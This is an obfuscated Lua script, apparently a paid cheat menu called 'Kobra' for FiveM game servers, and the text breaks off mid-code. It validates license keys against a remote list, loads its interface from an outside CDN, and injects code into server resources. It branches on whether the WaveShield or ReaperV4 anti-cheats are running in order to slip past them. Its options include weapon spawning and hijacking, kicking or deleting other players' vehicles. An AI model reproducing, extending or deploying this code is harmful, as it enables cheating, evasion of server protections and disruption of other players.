MachoLockLogger(4 -3 );local v0="jkiushdiufhsdbofihUYHFUYJASHIUYGAS872765873u4hj5nkjbytFCUSAKIHJJYDSFHTDHSHOIUHdiuaghdfjyhsbdioufjneqwouerhy287y34gujkdsnikufguyhcflbijksdfhugygdisufhgsyhtgdfvsd";local function v1(v118,v119) local v120=0 + 0 ;local v121;while true do if (v120==(390 -(14 + 376))) then v121="";for v666=1 -0 , #v118 do local v667=0 + 0 ;local v668;while true do if (v667==(0 + 0)) then v668=string.byte(v118,v666);v121=v121   .. string.char((v668-v119)%(245 + 11) ) ;break;end end end v120=2 -1 ;end if (v120==(1 + 0)) then if DEBUG then local v755={};for v851=79 -(23 + 55) , #v121 do v755[v851]=string.byte(v121,v851);end print("[KOBRA Safety] Decoded secret: "   .. table.concat(v755,",") );end return v121;end end end local v2="https://raw.githubusercontent.com/WM5M/564756558758547545475566858754hnfvngfjhgvgjfjghfffjfgffjgj/refs/heads/main/wzmkeys.json";local v3=MachoWebRequest(v2);local v4=MachoAuthenticationKey();local v5=true;local function v6() local v122=0 -0 ;local v123;while true do if (v122==(0 + 0)) then v123=GetCloudTimeAsInt();return ((v123>(0 + 0)) and v123) or (0 -0) ;end end end local function v7(v124) local v125=0 + 0 ;local v126;local v127;local v128;local v129;local v130;local v131;local v132;while true do if (v125==0) then if (type(v124)~="string") then return nil;end v126,v127,v128,v129,v130,v131=string.match(v124,"(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z");v125=902 -(652 + 249) ;end if (v125==2) then return (v132 * (231219 -144819)) + (tonumber(v129) * (5468 -(708 + 1160))) + (tonumber(v130) * (162 -102)) + tonumber(v131) ;end if (v125==1) then if  not v126 then return nil;end v132=((tonumber(v126) -(3591 -1621)) * 365) + math.floor((tonumber(v126) -(1996 -(10 + 17)))/(1 + 3) ) + ((tonumber(v127) -(1733 -(1400 + 332))) * 30) + tonumber(v128) ;v125=2;end end end local function v8() if  not v3 then return false,"No key list available";end local v133,v134=pcall(json.decode,v3);if ( not v133 or  not v134 or (type(v134)~="table")) then return false,"Key list invalid";end local v135=v6();for v330,v331 in ipairs(v134) do if ((type(v331)=="table") and (v331.key==v4)) then if (v331.expires and (type(v331.expires)=="string")) then local v756=v7(v331.expires);if  not v756 then return false,"Bad expiry format";end if (v756>v135) then return true,"Key valid (not expired)",v756;else return false,"Key expired",v756;end elseif v5 then return false,"Key missing expiry (strict mode)";else return true,"Key valid (no expiry field)";end end end return false,"Key not found";end local v9,v10,v11=v8();if  not v9 then local v332=0;while true do if (v332==(0 -0)) then MachoMenuNotification("KOBRA","Your key ain't valid lmfao: "   .. v4   .. " ("   .. v10   .. ")" ,1918 -(242 + 1666) );return;end end end Citizen.CreateThread(function() if (v11 and (v11>(0 + 0))) then local v514=v6();local v515=v11-v514 ;if (v515>(0 + 0)) then local v669=0;local v670;local v671;local v672;while true do if (v669==0) then v670=math.floor(v515/86400 );v671=math.floor((v515%86400)/(3069 + 531) );v669=1;end if (v669==(941 -(850 + 90))) then v672=string.format("Your key is valid. Expires in %d days and %d hours.",v670,v671);MachoMenuNotification("KOBRA",v672,8 -3 );break;end end else MachoMenuNotification("KOBRA","Key expired.",1400 -(360 + 1030) );end else MachoMenuNotification("KOBRA","Key valid (no expiry field).",5 + 0 );end end);local v12={};local v13=false;local v14=nil;local v15=1;local v16={};local v17=v16;local v18=nil;local v19=2 -1 ;local v20={};local v21={};local v22=nil;local v23="H";local v24=false;local v25={};local v26=false;local v27={};local v28={[GetHashKey("weapon_unarmed")]="Fists",[GetHashKey("weapon_knife")]="Knife",[GetHashKey("weapon_nightstick")]="Nightstick",[GetHashKey("weapon_hammer")]="Hammer",[GetHashKey("weapon_bat")]="Baseball Bat",[GetHashKey("weapon_golfclub")]="Golf Club",[GetHashKey("weapon_crowbar")]="Crowbar",[GetHashKey("weapon_pistol")]="Pistol",[GetHashKey("weapon_pistol_mk2")]="Pistol Mk II",[GetHashKey("weapon_snspistol_mk2")]="SNS Pistol Mk II",[GetHashKey("weapon_ceramicpistol")]="Ceramic Pistol",[GetHashKey("weapon_revolver_mk2")]="Heavy Revolver Mk II",[GetHashKey("weapon_doubleaction")]="Double-Action Revolver",[GetHashKey("weapon_gadgetpistol")]="Gadget Pistol",[GetHashKey("weapon_pistolxm3")]="WM 29 Pistol",[GetHashKey("weapon_combatpistol")]="Combat Pistol",[GetHashKey("weapon_appistol")]="AP Pistol",[GetHashKey("weapon_pistol50")]="Pistol .50",[GetHashKey("weapon_microsmg")]="Micro SMG",[GetHashKey("weapon_smg")]="SMG",[GetHashKey("weapon_assaultsmg")]="Assault SMG",[GetHashKey("weapon_assaultrifle")]="Assault Rifle",[GetHashKey("weapon_assaultrifle_mk2")]="Assault Rifle Mk II",[GetHashKey("weapon_specialcarbine_mk2")]="Special Carbine Mk II",[GetHashKey("weapon_bullpuprifle_mk2")]="Bullpup Rifle Mk II",[GetHashKey("weapon_militaryrifle")]="Military Rifle",[GetHashKey("weapon_tacticalrifle")]="Service Carbine",[GetHashKey("weapon_battlerifle")]="Battle Rifle",[GetHashKey("weapon_carbinerifle")]="Carbine Rifle",[GetHashKey("weapon_advancedrifle")]="Advanced Rifle",[GetHashKey("weapon_mg")]="MG",[GetHashKey("weapon_combatmg")]="Combat MG",[GetHashKey("weapon_pumpshotgun")]="Pump Shotgun",[GetHashKey("weapon_sawnoffshotgun")]="Sawed-Off Shotgun",[GetHashKey("weapon_assaultshotgun")]="Assault Shotgun",[GetHashKey("weapon_bullpupshotgun")]="Bullpup Shotgun",[GetHashKey("weapon_hackingdevice")]="Hacking Device",[GetHashKey("weapon_stungun")]="Stun Gun",[GetHashKey("weapon_stungun_mp")]="Stun Gun MP",[GetHashKey("weapon_sniperrifle")]="Sniper Rifle",[GetHashKey("weapon_heavysniper")]="Heavy Sniper",[GetHashKey("weapon_grenadelauncher")]="Grenade Launcher",[GetHashKey("weapon_rpg")]="RPG",[GetHashKey("weapon_minigun")]="Minigun",[GetHashKey("weapon_grenade")]="Grenade",[GetHashKey("weapon_stickybomb")]="Sticky Bomb",[GetHashKey("weapon_smokegrenade")]="Smoke Grenade",[GetHashKey("weapon_bzgas")]="BZ Gas",[GetHashKey("weapon_molotov")]="Molotov Cocktail",[GetHashKey("weapon_fireextinguisher")]="Fire Extinguisher",[GetHashKey("weapon_petrolcan")]="Jerry Can",[GetHashKey("weapon_ball")]="Baseball",[GetHashKey("weapon_snspistol")]="SNS Pistol",[GetHashKey("weapon_bottle")]="Broken Bottle",[GetHashKey("weapon_gusenberg")]="Gusenberg Sweeper",[GetHashKey("weapon_specialcarbine")]="Special Carbine",[GetHashKey("weapon_heavypistol")]="Heavy Pistol",[GetHashKey("weapon_bullpuprifle")]="Bullpup Rifle",[GetHashKey("weapon_dagger")]="Dagger",[GetHashKey("weapon_vintagepistol")]="Vintage Pistol",[GetHashKey("weapon_firework")]="Firework Launcher",[GetHashKey("weapon_musket")]="Musket",[GetHashKey("weapon_heavyshotgun")]="Heavy Shotgun",[GetHashKey("weapon_marksmanrifle")]="Marksman Rifle",[GetHashKey("weapon_hominglauncher")]="Homing Launcher",[GetHashKey("weapon_proxmine")]="Proximity Mines",[GetHashKey("weapon_snowball")]="Snowball",[GetHashKey("weapon_flaregun")]="Flare Gun",[GetHashKey("weapon_garbagebag")]="Garbage Bag",[GetHashKey("weapon_handcuffs")]="Handcuffs",[GetHashKey("weapon_combatpdw")]="Combat PDW",[GetHashKey("weapon_marksmanpistol")]="Marksman Pistol",[GetHashKey("weapon_knuckle")]="Knuckle Dusters",[GetHashKey("weapon_hatchet")]="Hatchet",[GetHashKey("weapon_railgun")]="Railgun",[GetHashKey("weapon_machinepistol")]="Machine Pistol",[GetHashKey("weapon_switchblade")]="Switchblade",[GetHashKey("weapon_revolver")]="Heavy Revolver",[GetHashKey("weapon_heavyrifle")]="Heavy Rifle",[GetHashKey("weapon_dbshotgun")]="Double Barrel Shotgun",[GetHashKey("weapon_compactrifle")]="Compact Rifle",[GetHashKey("weapon_battleaxe")]="Battle Axe",[GetHashKey("weapon_compactlauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_minismg")]="Mini SMG",[GetHashKey("weapon_pipebomb")]="Pipe Bomb",[GetHashKey("weapon_poolcue")]="Pool Cue",[GetHashKey("weapon_wrench")]="Wrench",[GetHashKey("weapon_autoshotgun")]="Sweeper Shotgun",[GetHashKey("weapon_bread")]="Piece of Bread",[GetHashKey("weapon_stone_hatchet")]="Stone Hatchet",[GetHashKey("weapon_rayminigun")]="Unholy Hellbringer",[GetHashKey("weapon_raycarbine")]="Widowmaker",[GetHashKey("weapon_compactgrenadelauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_smugglerpistol")]="Up-n-Atomizer",[GetHashKey("weapon_raypistol")]="Up-n-Atomizer",[GetHashKey("weapon_perico_pistol")]="Ceramic Pistol",[GetHashKey("weapon_carbinerifle_mk2")]="Carbine Rifle Mk II",[GetHashKey("weapon_combatmg_mk2")]="Combat MG Mk II",[GetHashKey("weapon_heavysniper_mk2")]="Heavy Sniper Mk II",[GetHashKey("weapon_marksmanrifle_mk2")]="Marksman Rifle Mk II",[GetHashKey("weapon_pumpshotgun_mk2")]="Pump Shotgun Mk II",[GetHashKey("weapon_smg_mk2")]="SMG Mk II",[GetHashKey("weapon_raycarbine_mk2")]="Widowmaker Mk II",[GetHashKey("weapon_machete")]="Machete",[GetHashKey("weapon_flashlight")]="Flashlight",[GetHashKey("weapon_hazardousknife")]="Hazardous Knife",[GetHashKey("weapon_navyrevolver")]="Navy Revolver",[GetHashKey("weapon_golfball")]="Golf Ball"};local v29=false;local v30=false;local v31=false;local v32=false;local v33=nil;local v34=1 -0 ;local v35=1662 -(909 + 752) ;local v36={"WEAPON_APPISTOL","WEAPON_PISTOL","WEAPON_SMG","WEAPON_ASSAULTRIFLE","WEAPON_RPG","WEAPON_PERMKILL","WEAPON_AIRSTRIKE_ROCKET"};local v37={"Adder","Zentorno","Comet","Banshee","Trash","Dump"};local v38={"Default","Teleport","Shoot Weapon","Kick from Vehicle","Hijack Vehicle","Delete Vehicle"};local v39=1 + 0 ;local v40=false;local v41=false;local v42=false;local v43=false;local v44={[24 + 3 ]="Escape",[60 + 52 ]="F1",[113]="F2",[521 -(174 + 233) ]="F3",[321 -206 ]="F4",[203 -87 ]="F5",[53 + 64 ]="F6",[1292 -(663 + 511) ]="F7",[107 + 12 ]="F8",[27 + 93 ]="F9",[121]="F10",[122]="F11",[379 -256 ]="F12",[117 + 75 ]="`",[49]="1",[117 -67 ]="2",[123 -72 ]="3",[52]="4",[53]="5",[26 + 28 ]="6",[55]="7",[108 -52 ]="8",[41 + 16 ]="9",[5 + 43 ]="0",[911 -(478 + 244) ]="-",[187]="=",[525 -(440 + 77) ]="Backspace",[5 + 4 ]="Tab",[296 -215 ]="Q",[87]="W",[69]="E",[82]="R",[84]="T",[89]="Y",[1641 -(655 + 901) ]="U",[14 + 59 ]="I",[61 + 18 ]="O",[55 + 25 ]="P",[219]="[",[890 -669 ]="]",[1665 -(695 + 750) ]="\\",[20]="CapsLock",[221 -156 ]="A",[127 -44 ]="S",[68]="D",[281 -211 ]="F",[422 -(285 + 66) ]="G",[167 -95 ]="H",[1384 -(682 + 628) ]="J",[13 + 62 ]="K",[375 -(176 + 123) ]="L",[78 + 108 ]=";",[222]="'",[13]="Enter",[16]="Shift",[66 + 24 ]="Z",[88]="X",[67]="C",[355 -(239 + 30) ]="V",[18 + 48 ]="B",[78]="N",[75 + 2 ]="M",[332 -144 ]=",",[592 -402 ]=".",[506 -(306 + 9) ]="/",[59 -42 ]="Control",[8 + 38 ]="Delete",[33]="PageUp",[21 + 13 ]="PageDown",[35]="End",[18 + 18 ]="Home",[38]="ArrowUp",[114 -74 ]="ArrowDown",[1412 -(1140 + 235) ]="ArrowLeft",[25 + 14 ]="ArrowRight"};local v45={[25 + 2 ]=83 + 239 ,[164 -(33 + 19) ]=104 + 184 ,[338 -225 ]=128 + 161 ,[223 -109 ]=160 + 10 ,[804 -(586 + 103) ]=16 + 151 ,[116]=510 -344 ,[117]=1655 -(1309 + 179) ,[212 -94 ]=74 + 94 ,[319 -200 ]=128 + 41 ,[254 -134 ]=111 -55 ,[730 -(295 + 314) ]=139 -82 ,[122]=344,[2085 -(1300 + 662) ]=1083 -738 ,[1947 -(1178 + 577) ]=127 + 116 ,[49]=157,[50]=158,[51]=472 -312 ,[1457 -(851 + 554) ]=146 + 18 ,[53]=165,[149 -95 ]=345 -186 ,[357 -(115 + 187) ]=161,[43 + 13 ]=162,[54 + 3 ]=163,[188 -140 ]=1243 -(160 + 1001) ,[166 + 23 ]=58 + 26 ,[382 -195 ]=441 -(237 + 121) ,[905 -(525 + 372) ]=335 -158 ,[29 -20 ]=179 -(96 + 46) ,[858 -(643 + 134) ]=16 + 28 ,[208 -121 ]=118 -86 ,[67 + 2 ]=90 -44 ,[167 -85 ]=764 -(316 + 403) ,[56 + 28 ]=673 -428 ,[89]=246,[85]=110 + 193 ,[183 -110 ]=53 + 21 ,[26 + 53 ]=199,[277 -197 ]=33 -26 ,[454 -235 ]=3 + 36 ,[434 -213 ]=2 + 38 ,[647 -427 ]=53 -(12 + 5) ,[77 -57 ]=137,[138 -73 ]=34,[83]=70 -37 ,[168 -100 ]=30,[70]=10 + 39 ,[2044 -(1656 + 317) ]=47,[72]=74,[66 + 8 ]=250 + 61 ,[199 -124 ]=311,[76]=34 -27 ,[540 -(5 + 349) ]=81,[222]=389 -307 ,[13]=1289 -(266 + 1005) ,[11 + 5 ]=71 -50 ,[90]=26 -6 ,[1784 -(561 + 1135) ]=94 -21 ,[220 -153 ]=26,[1152 -(507 + 559) ]=0 -0 ,[204 -138 ]=29,[466 -(212 + 176) ]=249,[982 -(250 + 655) ]=665 -421 ,[188]=142 -60 ,[297 -107 ]=81,[2147 -(1869 + 87) ]=83,[58 -41 ]=36,[46]=2079 -(484 + 1417) ,[70 -37 ]=10,[56 -22 ]=784 -(48 + 725) ,[57 -22 ]=571 -358 ,[36]=124 + 89 ,[101 -63 ]=8 + 19 ,[40]=173,[11 + 26 ]=174,[892 -(152 + 701) ]=1486 -(430 + 881) };local v46={weapon_unarmed={label="Unarmed",hash=GetHashKey("weapon_unarmed")},weapon_knife={label="Knife",hash=GetHashKey("weapon_knife")},weapon_dagger={label="Dagger",hash=GetHashKey("weapon_dagger")},weapon_bat={label="Baseball Bat",hash=GetHashKey("weapon_bat")},weapon_bottle={label="Broken Bottle",hash=GetHashKey("weapon_bottle")},weapon_crowbar={label="Crowbar",hash=GetHashKey("weapon_crowbar")},weapon_golfclub={label="Golf Club",hash=GetHashKey("weapon_golfclub")},weapon_hammer={label="Hammer",hash=GetHashKey("weapon_hammer")},weapon_hatchet={label="Hatchet",hash=GetHashKey("weapon_hatchet")},weapon_machete={label="Machete",hash=GetHashKey("weapon_machete")},weapon_switchblade={label="Switchblade",hash=GetHashKey("weapon_switchblade")},weapon_nightstick={label="Nightstick",hash=GetHashKey("weapon_nightstick")},weapon_wrench={label="Wrench",hash=GetHashKey("weapon_wrench")},weapon_pistol={label="Pistol",hash=GetHashKey("weapon_pistol")},weapon_pistol_mk2={label="Pistol Mk II",hash=GetHashKey("weapon_pistol_mk2")},weapon_combatpistol={label="Combat Pistol",hash=GetHashKey("weapon_combatpistol")},weapon_appistol={label="AP Pistol",hash=GetHashKey("weapon_appistol")},weapon_stungun={label="Taser",hash=GetHashKey("weapon_stungun")},weapon_pistol50={label="Pistol .50",hash=GetHashKey("weapon_pistol50")},weapon_snspistol={label="SNS Pistol",hash=GetHashKey("weapon_snspistol")},weapon_heavypistol={label="Heavy Pistol",hash=GetHashKey("weapon_heavypistol")},weapon_vintagepistol={label="Vintage Pistol",hash=GetHashKey("weapon_vintagepistol")},weapon_flaregun={label="Flare Gun",hash=GetHashKey("weapon_flaregun")},weapon_microsmg={label="Micro SMG",hash=GetHashKey("weapon_microsmg")},weapon_smg={label="SMG",hash=GetHashKey("weapon_smg")},weapon_smg_mk2={label="SMG Mk II",hash=GetHashKey("weapon_smg_mk2")},weapon_assaultsmg={label="Assault SMG",hash=GetHashKey("weapon_assaultsmg")},weapon_machinepistol={label="Machine Pistol",hash=GetHashKey("weapon_machinepistol")},weapon_minismg={label="Mini SMG",hash=GetHashKey("weapon_minismg")},weapon_combatpdw={label="Combat PDW",hash=GetHashKey("weapon_combatpdw")},weapon_assaultrifle={label="Assault Rifle",hash=GetHashKey("weapon_assaultrifle")},weapon_assaultrifle_mk2={label="Assault Rifle Mk II",hash=GetHashKey("weapon_assaultrifle_mk2")},weapon_carbinerifle={label="Carbine Rifle",hash=GetHashKey("weapon_carbinerifle")},weapon_carbinerifle_mk2={label="Carbine Rifle Mk II",hash=GetHashKey("weapon_carbinerifle_mk2")},weapon_advancedrifle={label="Advanced Rifle",hash=GetHashKey("weapon_advancedrifle")},weapon_specialcarbine={label="Special Carbine",hash=GetHashKey("weapon_specialcarbine")},weapon_bullpuprifle={label="Bullpup Rifle",hash=GetHashKey("weapon_bullpuprifle")},weapon_bullpuprifle_mk2={label="Bullpup Rifle Mk II",hash=GetHashKey("weapon_bullpuprifle_mk2")},weapon_compactrifle={label="Compact Rifle",hash=GetHashKey("weapon_compactrifle")},weapon_marksmanrifle={label="Marksman Rifle",hash=GetHashKey("weapon_marksmanrifle")},weapon_pumpshotgun={label="Pump Shotgun",hash=GetHashKey("weapon_pumpshotgun")},weapon_pumpshotgun_mk2={label="Pump Shotgun Mk II",hash=GetHashKey("weapon_pumpshotgun_mk2")},weapon_sawnoffshotgun={label="Sawed-Off Shotgun",hash=GetHashKey("weapon_sawnoffshotgun")},weapon_assaultshotgun={label="Assault Shotgun",hash=GetHashKey("weapon_assaultshotgun")},weapon_bullpupshotgun={label="Bullpup Shotgun",hash=GetHashKey("weapon_bullpupshotgun")},weapon_heavyshotgun={label="Heavy Shotgun",hash=GetHashKey("weapon_heavyshotgun")},weapon_autoshotgun={label="Auto Shotgun",hash=GetHashKey("weapon_autoshotgun")},weapon_sniperrifle={label="Sniper Rifle",hash=GetHashKey("weapon_sniperrifle")},weapon_heavysniper={label="Heavy Sniper",hash=GetHashKey("weapon_heavysniper")},weapon_heavysniper_mk2={label="Heavy Sniper Mk II",hash=GetHashKey("weapon_heavysniper_mk2")},weapon_marksmanrifle_mk2={label="Marksman Rifle Mk II",hash=GetHashKey("weapon_marksmanrifle_mk2")},weapon_grenade={label="Grenade",hash=GetHashKey("weapon_grenade")},weapon_stickybomb={label="Sticky Bomb",hash=GetHashKey("weapon_stickybomb")},weapon_molotov={label="Molotov Cocktail",hash=GetHashKey("weapon_molotov")},weapon_pipebomb={label="Pipe Bomb",hash=GetHashKey("weapon_pipebomb")},weapon_proxmine={label="Proximity Mine",hash=GetHashKey("weapon_proxmine")},weapon_rpg={label="RPG",hash=GetHashKey("weapon_rpg")},weapon_grenadelauncher={label="Grenade Launcher",hash=GetHashKey("weapon_grenadelauncher")},weapon_hominglauncher={label="Homing Launcher",hash=GetHashKey("weapon_hominglauncher")},weapon_minigun={label="Minigun",hash=GetHashKey("weapon_minigun")},weapon_railgun={label="Railgun",hash=GetHashKey("weapon_railgun")},weapon_ball={label="Baseball",hash=GetHashKey("weapon_ball")},weapon_smokegrenade={label="Smoke Grenade",hash=GetHashKey("weapon_smokegrenade")},weapon_flare={label="Flare",hash=GetHashKey("weapon_flare")},weapon_petrolcan={label="Jerry Can",hash=GetHashKey("weapon_petrolcan")},weapon_bzgas={label="BZ Gas",hash=GetHashKey("weapon_bzgas")}};local v47=((GetResourceState("WaveShield")=="started") and "Raw") or "Default" ;local v48=((v47=="Raw") and MachoInjectResourceRaw) or MachoInjectResource ;local function v49(v136) MachoInjectResource("any",v136);end v12.Debug=function(v137,v138,v139) local v140=0 + 0 ;local v141;local v142;while true do if (1==v140) then print(("^7[^5Kobra^7]: [%sDEBUG^7] >> %s"):format(v142,v139));break;end if (v140==(895 -(557 + 338))) then v141={red="^1",yellow="^3",green="^2",info="^5"};v142=v141[v138] or "^5" ;v140=1 + 0 ;end end end;v12.SendMessage=function(v143,v144) if (v14 and v144) then MachoSendDuiMessage(v14,json.encode(v144));end end;v12.Notify=function(v145,v146,v147,v148,v149) v145:SendMessage({action="showNotification",type=v146,title=v147,desc=v148,duration=v149});end;v12.GetMenuPath=function(v150) local v151=0 -0 ;local v152;while true do if (v151==1) then return v152;end if (v151==(0 -0)) then v152={"Kobra Menu by JayMods"};for v673=2 -1 , #v21 do table.insert(v152,v21[v673]);end v151=802 -(499 + 302) ;end end end;v12.UpdateElements=function(v153,v154) if ( not v154 or (type(v154)~="table")) then return;end local v155={action="updateElements",elements=v154,index=v15-1 ,path=v153:GetMenuPath()};if (v18 and (type(v18)=="table") and ( #v18>(866 -(39 + 827)))) then v155.categories=v18;v155.categoryIndex=(v19 or 1) -(2 -1) ;end v153:SendMessage(v155);end;v12.Initialize=function(v156) local v157=0 -0 ;local v158;while true do if (v157==(0 -0)) then v156:Debug("yellow","Kobra loading... Creating DUI and prompting keybind.");v158="https://rawcdn.githack.com/WM5M/sdkhbvfsdhjkvbdbcfjgasvdhjve64654656843242hjg4g43kg4aguk534/refs/heads/main/pro2.html";v157=1 -0 ;end if (v157==1) then v14=MachoCreateDui(v158);if  not v14 then v156:Debug("red","Failed to create DUI!");return;end v157=2;end if (v157==(1 + 1)) then MachoShowDui(v14);Wait(4390 -2890 );v157=3;end if (v157==(1 + 2)) then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title="Choose Menu Key",value=""}));SetNuiFocus(true,true);break;end end end;v12.HideUI=function(v159,v160) local v161=0 -0 ;while true do if (v161==(105 -(103 + 1))) then v12:SendMessage({action="showUI",visible=false});break;end if (0==v161) then if v160 then v22={currentMenu=v17,hoveredIndex=v15,menuStack=v20,menuLabelStack=v21,currentCategories=v18,currentCategoryIndex=v19};else v22=nil;end v13=false;v161=555 -(475 + 79) ;end end end;v12.SendMessage=function(v162,v163) local v164=0 -0 ;while true do if (v164==(0 -0)) then if ( not v14 or  not v163 or (type(v163)~="table")) then return;end MachoSendDuiMessage(v14,json.encode(v163));break;end end end;v12.ShowUI=function(v165) local v166=0 + 0 ;local v167;while true do if ((1 + 0)==v166) then if (v18 and ( #v18>(1503 -(1395 + 108)))) then local v757=0 -0 ;while true do if (0==v757) then v167.categories=v18;v167.categoryIndex=v19-(1205 -(7 + 1197)) ;break;end end end v165:SendMessage(v167);break;end if (0==v166) then v13=true;v167={action="showUI",visible=true,elements=v17,index=v15-1 ,path=v165:GetMenuPath(),username=Username or "KobraBypass" ,header="JayMods",theme="kobra-red-black"};v166=1 + 0 ;end end end;v12.UpdateElements=function(v168,v169) local v170=0 + 0 ;local v171;while true do if (v170==1) then if (v18 and ( #v18>(319 -(27 + 292)))) then v171.categories=v18;v171.categoryIndex=(v19 or (2 -1)) -(1 -0) ;end v168:SendMessage(v171);break;end if ((0 -0)==v170) then if ( not v169 or (type(v169)~="table")) then return;end v171={action="updateElements",elements=v169,index=v15-(1 -0) ,path=v168:GetMenuPath(),header="JayMods"};v170=1 -0 ;end end end;v26=false;MachoOnKeyDown(function(v172) local v173=139 -(43 + 96) ;while true do if (v173==(4 -3)) then if (v172==38) then v12:SendMessage({action="keydown",key="ArrowUp"});return;end if (v172==(90 -50)) then local v760=0 + 0 ;while true do if (v760==(0 + 0)) then v12:SendMessage({action="keydown",key="ArrowDown"});return;end end end v173=2;end if (v173==(0 -0)) then if ((v172==(7 + 9)) or (v172==(299 -139)) or (v172==(51 + 110))) then v26=true;end if  not v13 then return;end v173=1 + 0 ;end if (v173==(1753 -(1414 + 337))) then if (v172==(1953 -(1642 + 298))) then v12:SendMessage({action="keydown",key="Enter"});return;end break;end end end);MachoOnKeyUp(function(v174) if ((v174==16) or (v174==(417 -257)) or (v174==(463 -302))) then v26=false;end end);local v58=nil;local function v59(v175,v176,v177,v178) local v179=0 -0 ;while true do if (v179==(1 + 2)) then v24=false;break;end if (v179==1) then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v175,value=v58.buffer}));if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);end v179=2 + 0 ;end if (v179==0) then if v58 then return;end v58={title=v175,buffer=v176 or "" ,maxLength=1004 -(357 + 615) ,onConfirm=v177,type=v178 or "typeable" ,closeable=((v178=="keybind") and false) or true ,active=true};v179=1 + 0 ;end if (v179==(4 -2)) then Wait(215 + 35 );v12:HideUI(true);v179=3;end end end MachoOnKeyDown(function(v180) if ( not v58 or  not v58.active) then return;end if (v180==13) then v58.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));if v58.onConfirm then v58.onConfirm(v58.buffer);end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);end v58=nil;v24=true;return;elseif (v180==8) then if (v58.type=="typeable") then v58.buffer=v58.buffer:sub(2 -1 , -(2 + 0));else v58.buffer="";end elseif (v180==(2 + 25)) then local v855=0 + 0 ;while true do if (v855==(1301 -(384 + 917))) then if  not v58.closeable then return;end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);end v855=698 -(128 + 569) ;end if (v855==3) then return;end if ((1545 -(1407 + 136))==v855) then v58=nil;v24=true;v855=3;end if (v855==1) then v58.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));v855=2;end end elseif (v58.type=="keybind") then local v1019=0;local v1020;while true do if (v1019==(1887 -(687 + 1200))) then v1020=v44[v180];if v1020 then if (v58.buffer~=v1020) then v58.buffer=v1020;end end break;end end elseif (v58.type=="typeable") then local v1138=1710 -(556 + 1154) ;local v1139;local v1140;while true do if (v1138==(0 -0)) then v1139={[143 -(9 + 86) ]="0",[470 -(275 + 146) ]="1",[9 + 41 ]="2",[115 -(29 + 35) ]="3",[52]="4",[234 -181 ]="5",[54]="6",[164 -109 ]="7",[247 -191 ]="8",[57]="9",[65]="A",[43 + 23 ]="B",[1079 -(53 + 959) ]="C",[476 -(312 + 96) ]="D",[119 -50 ]="E",[355 -(147 + 138) ]="F",[970 -(813 + 86) ]="G",[66 + 6 ]="H",[73]="I",[136 -62 ]="J",[567 -(18 + 474) ]="K",[76]="L",[26 + 51 ]="M",[78]="N",[257 -178 ]="O",[1166 -(860 + 226) ]="P",[384 -(121 + 182) ]="Q",[11 + 71 ]="R",[1323 -(988 + 252) ]="S",[10 + 74 ]="T",[85]="U",[27 + 59 ]="V",[87]="W",[88]="X",[2059 -(49 + 1921) ]="Y",[980 -(223 + 667) ]="Z",[189]="-",[239 -(51 + 1) ]="=",[188]=",",[327 -137 ]=".",[398 -212 ]=";",[1347 -(146 + 979) ]="'",[54 + 137 ]="/",[797 -(311 + 294) ]="`",[32]=" "};v1140=v1139[v180];v1138=1;end if (v1138==(2 -1)) then if (v1140 and ( #v58.buffer<v58.maxLength)) then if v12:IsShiftHeld() then if v1140:match("%a") then v1140=v1140:upper();elseif (v1140=="-") then v1140="_";end elseif v1140:match("%a") then v1140=v1140:lower();end v58.buffer=v58.buffer   .. v1140 ;end break;end end end if v58 then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v58.title,value=v58.buffer}));end end);CreateThread(function() while true do local v333=0;while true do if (v333==(0 + 0)) then Wait(0);if (v58~=nil) then local v856=0;while true do if (v856==(1444 -(496 + 947))) then for v1141=0,1715 -(1233 + 125)  do if ((v1141<(20 + 28)) or (v1141>(81 + 9))) then DisableControlAction(0,v1141,true);end end break;end if (v856==(0 + 0)) then if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);end SetPauseMenuActive(false);v856=1646 -(963 + 682) ;end end else Wait(500);end break;end end end end);v12.ScrollOne=function(v181,v182) local v183=0;local v184;while true do if (v183==1) then repeat if (v182=="Up") then local v857=0 + 0 ;while true do if (v857==(1504 -(504 + 1000))) then v15=v15-1 ;if (v15<(1 + 0)) then v15= #v17;end break;end end elseif (v182=="Down") then local v1021=0 + 0 ;while true do if (0==v1021) then v15=v15 + 1 + 0 ;if (v15> #v17) then v15=1 -0 ;end break;end end end v184=v184 + 1 + 0 ;if (v184>(117 + 83)) then break;end until v17[v15] and (v17[v15].type~="divider")  if v14 then v181:SendMessage({action="keydown",index=v15-(183 -(156 + 26)) });end break;end if (v183==0) then if ( not v182 or ( #v17==(0 + 0))) then return;end v184=0;v183=1 -0 ;end end end;v12.ScrollTwo=function(v185,v186) local v187=164 -(149 + 15) ;local v188;while true do if ((960 -(890 + 70))==v187) then v188=v17[v15];if  not v188 then return;end v187=118 -(39 + 78) ;end if (v187==1) then if (((v188.type=="scrollable") or (v188.type=="scrollable-checkbox")) and v188.values and ( #v188.values>0)) then local v761=482 -(14 + 468) 